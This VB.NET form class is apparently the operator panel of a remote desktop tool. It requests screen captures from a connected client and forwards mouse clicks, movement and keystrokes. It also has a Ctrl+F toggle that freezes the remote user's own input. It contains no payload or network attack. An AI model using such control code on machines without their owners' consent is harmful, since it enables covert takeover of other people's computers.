Imports System.ComponentModel

Public Class RemoteDesktop
    Public F As Form1
    Public C As Client
    Public isOK As Boolean = False
    Private LastMouseMoveTick As Long = 0
    Private Const MouseMoveThrottle As Long = 30 ' milliseconds
    Public IsFrozen As Boolean = False
    
    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Button1.PerformClick()
        ' Enable keyboard input
        Me.KeyPreview = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If Button1.Text = "OFF" Then
                Button1.Text = "Capturing..."
                Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.RemoteDesktopSend), Me.Width, Me.Height)
                Pending.Req_Out.Add(ClientReq)
            Else
                Button1.Text = "OFF"
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RemoteDesktop_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        If isOK = False Then
            isOK = True
            Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.RemoteDesktopSend), Me.Width, Me.Height)
            Pending.Req_Out.Add(ClientReq)
        End If
    End Sub

    Private Sub RemoteDesktop_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        isOK = False
    End Sub

    ' Convert picture box coordinates to actual screen coordinates
    ' The screenshot image may be scaled down from the actual screen resolution
    Private Function ConvertToRemoteCoordinates(ByVal pbX As Integer, ByVal pbY As Integer) As Point
        Try
            If PictureBox1.Image Is Nothing Then Return New Point(pbX, pbY)
            
            ' Check for zero dimensions to avoid division by zero
            If PictureBox1.Width = 0 OrElse PictureBox1.Height = 0 Then
                Return New Point(pbX, pbY)
            End If
            
            ' Step 1: Convert from picture box to image coordinates
            Dim scaleX As Double = CDbl(PictureBox1.Image.Width) / CDbl(PictureBox1.Width)
            Dim scaleY As Double = CDbl(PictureBox1.Image.Height) / CDbl(PictureBox1.Height)
            
            Dim imageX As Integer = CInt(pbX * scaleX)
            Dim imageY As Integer = CInt(pbY * scaleY)
            
            ' Step 2: Image coordinates ARE screen coordinates (screenshot is full screen size)
            ' Clamp to screen bounds
            Dim screenWidth As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim screenHeight As Integer = Screen.PrimaryScreen.Bounds.Height
            
            imageX = Math.Max(0, Math.Min(imageX, screenWidth - 1))
            imageY = Math.Max(0, Math.Min(imageY, screenHeight - 1))
            
            Debug.WriteLine("ConvertToRemoteCoordinates: pbX=" + pbX.ToString + " pbY=" + pbY.ToString + " -> screenX=" + imageX.ToString + " screenY=" + imageY.ToString)
            
            Return New Point(imageX, imageY)
        Catch ex As Exception
            Debug.WriteLine("ConvertToRemoteCoordinates: " + ex.Message)
            Return New Point(pbX, pbY)
        End Try
    End Function

    ' Handle mouse clicks on the remote desktop preview
    Private Sub PictureBox1_MouseClick(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseClick
        Try
            If C IsNot Nothing AndAlso C.IsConnected AndAlso Button1.Text = "Capturing..." Then
                Dim RemoteCoords As Point = ConvertToRemoteCoordinates(e.X, e.Y)
                Dim Button As Integer = 0
                If e.Button = MouseButtons.Left Then Button = 1
                If e.Button = MouseButtons.Right Then Button = 2
                If e.Button = MouseButtons.Middle Then Button = 3
                Debug.WriteLine("PictureBox1_MouseClick: Queuing MouseInput packet - Button=" + Button.ToString)
                Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.MouseInput), RemoteCoords.X, RemoteCoords.Y, Button)
                Pending.Req_Out.Add(ClientReq)
            End If
        Catch ex As Exception
            Debug.WriteLine("PictureBox1_MouseClick: " + ex.Message)
        End Try
    End Sub

    ' Handle mouse movement on the remote desktop preview (with throttling)
    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        Try
            If C IsNot Nothing AndAlso C.IsConnected AndAlso Button1.Text = "Capturing..." Then
                ' Throttle mouse movement to avoid flooding with packets
                Dim CurrentTick As Long = DateTime.Now.Ticks / 10000
                If (CurrentTick - LastMouseMoveTick) >= MouseMoveThrottle Then
                    LastMouseMoveTick = CurrentTick
                    Dim RemoteCoords As Point = ConvertToRemoteCoordinates(e.X, e.Y)
                    ' Send mouse movement (Button = 0)
                    Debug.WriteLine("PictureBox1_MouseMove: Queuing MouseInput packet - X=" + RemoteCoords.X.ToString + " Y=" + RemoteCoords.Y.ToString)
                    Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.MouseInput), RemoteCoords.X, RemoteCoords.Y, 0)
                    Pending.Req_Out.Add(ClientReq)
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine("PictureBox1_MouseMove: " + ex.Message)
        End Try
    End Sub

    ' Handle keyboard input
    Private Sub RemoteDesktop_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        Try
            ' F key toggles freeze mode
            If e.KeyCode = Keys.F AndAlso e.Control Then
                ToggleFreeze()
                e.Handled = True
                Return
            End If
            
            If C IsNot Nothing AndAlso C.IsConnected AndAlso Button1.Text = "Capturing..." Then
                Dim keyCode As Byte = CByte(e.KeyValue)
                Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.KeyboardInput), keyCode, True)
                Pending.Req_Out.Add(ClientReq)
                e.Handled = True
            End If
        Catch ex As Exception
            Debug.WriteLine("RemoteDesktop_KeyDown: " + ex.Message)
        End Try
    End Sub

    ' Toggle freeze mode for client mouse/keyboard input
    Public Sub ToggleFreeze()
        Try
            If C IsNot Nothing AndAlso C.IsConnected Then
                IsFrozen = Not IsFrozen
                Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.FreezeInput), IsFrozen)
                Pending.Req_Out.Add(ClientReq)
                Debug.WriteLine("TogglFreeze: Sent FreezeInput = " + IsFrozen.ToString)
                MessageBox.Show("Client input " + If(IsFrozen, "FROZEN", "UNFROZEN"), "Freeze Status")
            End If
        Catch ex As Exception
            Debug.WriteLine("ToggleFreeze error: " + ex.Message)
        End Try
    End Sub

    ' Handle keyboard key release
    Private Sub RemoteDesktop_KeyUp(sender As Object, e As KeyEventArgs) Handles Me.KeyUp
        Try
            If C IsNot Nothing AndAlso C.IsConnected AndAlso Button1.Text = "Capturing..." Then
                Dim keyCode As Byte = CByte(e.KeyValue)
                Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.KeyboardInput), keyCode, False)
                Pending.Req_Out.Add(ClientReq)
                e.Handled = True
            End If
        Catch ex As Exception
            Debug.WriteLine("RemoteDesktop_KeyUp: " + ex.Message)
        End Try
    End Sub

End Class